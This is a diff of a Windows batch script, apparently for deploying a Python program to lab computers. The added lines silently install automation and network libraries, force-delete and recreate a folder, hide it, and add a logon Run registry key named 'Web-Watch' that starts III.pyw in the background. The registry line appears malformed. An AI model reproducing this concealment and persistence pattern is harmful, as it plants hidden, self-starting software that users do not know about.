@@ -5,11 +5,12 @@ taskkill /f /t /im pythonw.exe
 
 pip install pywin32 pyautogui requests schedule pip-system-certs pywinauto -qqq
 
-if not exist "D:\III\" (
+if exist "D:\III\" (
+	rmdir /s /q "D:\III\"
 	mkdir "D:\III\"
+	attrib +h +r "D:\III\"
+	reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Web-Watch" /t REG_SZ /d "C:\Program Files\Python314\pythonw.exe" "III.pyw" /f
 )
-
-attrib +h +r "D:\III\"
 
 rem LAB 105
 if exist "C:\Users\lab136\III.pyw" move /Y "C:\Users\lab136\III.pyw" "D:\III\"
